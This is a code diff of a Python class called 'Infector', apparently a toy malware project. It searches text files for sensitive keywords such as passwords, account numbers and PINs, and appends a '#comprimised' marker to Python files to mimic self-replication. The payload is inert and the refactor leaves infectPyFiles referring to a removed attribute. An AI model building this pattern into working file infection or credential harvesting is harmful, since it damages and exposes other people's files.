@@ -1,28 +1,14 @@
 import os
 import re
+import pathlib
+from filehelper import FileHelper
 
 
 class Infector:
     def __init__(self):
-        self.files = {}
+        self.fileHelper = FileHelper()
 
-    def findFiles(self, extension):
-        filesFound = []
-        for files in os.walk(r"C:\Users\asadk\Documents\TEST"):  # TODO os.walk
-            for file in files[2]:
-                if file.split(".")[-1] == extension.lower():
-                    #print("File found: " + files[0] + "\\" + file + "\n")
-                    filesFound.append(files[0] + "\\" + file)
-                    self.files[extension.lower()] = filesFound
-    
-    def getTotalNumberOfFiles(self):
-        total = 0
-        for key in self.files:
-            total += len(self.files[key])
-        self.files['total'] = str(total)
-        return total
-
-    def searchVulnerableFileNames(self):
+    def findVulnerableFileNames(self):
         temp = 0
         vulnerablestrings = [
             "password",
@@ -33,19 +19,16 @@ class Infector:
             "drivers liscense",
             "pin",
         ]
-        for q in self.files:
-            for file in q.queue:
-                if str(file.split("\\")[-1].split(".")[0]) in vulnerablestrings:
-                    print(
-                        "Vulnerable File name:",
-                        "'{}'".format(file.split("\\")[-1].split(".")[0]),
-                    )
-                    temp += 1
-                    self.findVulnerablitiesInTxt(file)
-        return temp
+        for file in self.fileHelper.findAllFiles("txt"):
+            temp = file[::-1].split("\\")[0]
+            filename = temp[temp.find(".") + 1 :][::-1]
+            for string in vulnerablestrings:
+                x = re.findall("(?i)({}):*s*".format(string), filename)
+                if x != []:
+                    print(x)
 
     def findVulnerablitiesInTxt(self, file):
-        FH = [x.strip() for x in open(file, "r").readlines()]
+        sentences = [x.strip() for x in open(file, "r").readlines()]
         vulnerablestrings = [
             "password",
             "account",
@@ -55,18 +38,18 @@ class Infector:
             "drivers liscense",
             "pin",
         ]
-        for sentence in FH:
+        for sentence in sentences:
             for string in vulnerablestrings:
                 x = re.findall("(?i)({}):*s*".format(string), sentence)
                 if x != []:
                     print(x)
-    
-    def infectPyFiles(self):
-        print(self.files['py'])
-        for file in self.files['py']:
+
+    def infectPyFiles(self):  # mimics self replication
+        print(self.files["py"])
+        for file in self.files["py"]:
             try:
                 FH = open(file, "a")
-                FH.write('\n' + '''#comprimised''')
+                FH.write("\n" + """#comprimised""")
                 FH.close()
             except:
                 pass
